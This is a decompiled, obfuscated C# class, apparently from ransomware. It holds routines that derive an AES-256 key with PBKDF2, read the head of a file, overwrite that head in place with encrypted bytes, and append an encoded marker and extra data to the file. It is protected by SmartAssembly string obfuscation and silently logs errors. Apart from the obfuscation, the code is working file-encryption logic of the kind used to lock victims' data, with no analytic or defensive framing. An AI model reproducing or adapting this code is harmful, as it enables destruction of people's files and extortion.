using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace GlIxuPPoosXGy;

public static class MxUzGRRcXX
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] MrKxWXWOvvtfxsJ(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = mOtdCQeqThzQu(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes mOtdCQeqThzQu(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] QuWsNWvThdQ(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (kdXBbWqHjtnYq.dYQrpOPXkxY == getString_0(107397078))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (kdXBbWqHjtnYq.keaHDdagjiDMCTfH)
			{
				try
				{
					File.AppendAllText(kdXBbWqHjtnYq.RztYwSIsnQJzs, getString_0(107390679) + string_0 + getString_0(107402683) + ex.Message + getString_0(107396387));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void odkHVYyoApHj(string ZjXIlWQLYaMG, byte[] rFvIApGcuwP, byte[] jaymlfBImxINZRaE = null)
	{
		try
		{
			byte[] array = null;
			if (kdXBbWqHjtnYq.dYQrpOPXkxY == getString_0(107397078))
			{
				array = (kdXBbWqHjtnYq.fYzeXSQMFrly ? Encoding.ASCII.GetBytes(kdXBbWqHjtnYq.hNmpLWayyKYy(kdXBbWqHjtnYq.JXvIvRJSYKu) + kdXBbWqHjtnYq.hNmpLWayyKYy(getString_0(107402625)) + Convert.ToString(kdXBbWqHjtnYq.lgEGKUPjGpcc) + kdXBbWqHjtnYq.hNmpLWayyKYy(getString_0(107402625))) : Encoding.ASCII.GetBytes(kdXBbWqHjtnYq.hNmpLWayyKYy(kdXBbWqHjtnYq.JXvIvRJSYKu) + kdXBbWqHjtnYq.hNmpLWayyKYy(getString_0(107402634)) + Convert.ToString(kdXBbWqHjtnYq.lgEGKUPjGpcc) + kdXBbWqHjtnYq.hNmpLWayyKYy(getString_0(107402634))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(ZjXIlWQLYaMG, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(rFvIApGcuwP, 0, rFvIApGcuwP.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(ZjXIlWQLYaMG, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!kdXBbWqHjtnYq.fYzeXSQMFrly)
				{
					fileStream.Write(array, 0, array.Length);
					return;
				}
				fileStream.Write(jaymlfBImxINZRaE, 0, jaymlfBImxINZRaE.Length);
				fileStream.Write(array, 0, array.Length);
				return;
			}
			array = (kdXBbWqHjtnYq.fYzeXSQMFrly ? Encoding.ASCII.GetBytes(kdXBbWqHjtnYq.hNmpLWayyKYy(kdXBbWqHjtnYq.JXvIvRJSYKu) + kdXBbWqHjtnYq.hNmpLWayyKYy(getString_0(107402625)) + Convert.ToString(kdXBbWqHjtnYq.lgEGKUPjGpcc) + kdXBbWqHjtnYq.hNmpLWayyKYy(getString_0(107402625))) : Encoding.ASCII.GetBytes(kdXBbWqHjtnYq.hNmpLWayyKYy(kdXBbWqHjtnYq.JXvIvRJSYKu) + kdXBbWqHjtnYq.hNmpLWayyKYy(getString_0(107402634)) + Convert.ToString(kdXBbWqHjtnYq.lgEGKUPjGpcc) + kdXBbWqHjtnYq.hNmpLWayyKYy(getString_0(107402634))));
			FileStream fileStream2 = new FileStream(ZjXIlWQLYaMG, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream2.Write(rFvIApGcuwP, 0, rFvIApGcuwP.Length);
			fileStream2.Close();
			fileStream2.Dispose();
			using FileStream fileStream3 = new FileStream(ZjXIlWQLYaMG, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!kdXBbWqHjtnYq.fYzeXSQMFrly)
			{
				fileStream3.Write(array, 0, array.Length);
				return;
			}
			fileStream3.Write(jaymlfBImxINZRaE, 0, jaymlfBImxINZRaE.Length);
			fileStream3.Write(array, 0, array.Length);
		}
		catch (Exception ex)
		{
			if (kdXBbWqHjtnYq.keaHDdagjiDMCTfH)
			{
				try
				{
					File.AppendAllText(kdXBbWqHjtnYq.RztYwSIsnQJzs, getString_0(107390679) + ZjXIlWQLYaMG + getString_0(107402648) + ex.Message + getString_0(107396387));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (kdXBbWqHjtnYq.fYzeXSQMFrly ? Encoding.ASCII.GetBytes(kdXBbWqHjtnYq.hNmpLWayyKYy(kdXBbWqHjtnYq.JXvIvRJSYKu) + kdXBbWqHjtnYq.hNmpLWayyKYy(getString_0(107402625)) + Convert.ToString(kdXBbWqHjtnYq.lgEGKUPjGpcc) + kdXBbWqHjtnYq.hNmpLWayyKYy(getString_0(107402625))) : Encoding.ASCII.GetBytes(kdXBbWqHjtnYq.hNmpLWayyKYy(kdXBbWqHjtnYq.JXvIvRJSYKu) + kdXBbWqHjtnYq.hNmpLWayyKYy(getString_0(107402634)) + Convert.ToString(kdXBbWqHjtnYq.lgEGKUPjGpcc) + kdXBbWqHjtnYq.hNmpLWayyKYy(getString_0(107402634))));
			FileStream fileStream4 = new FileStream(ZjXIlWQLYaMG, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(rFvIApGcuwP, 0, rFvIApGcuwP.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(ZjXIlWQLYaMG, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!kdXBbWqHjtnYq.fYzeXSQMFrly)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(jaymlfBImxINZRaE, 0, jaymlfBImxINZRaE.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static MxUzGRRcXX()
	{
		Strings.CreateGetStringDelegate(typeof(MxUzGRRcXX));
	}
}
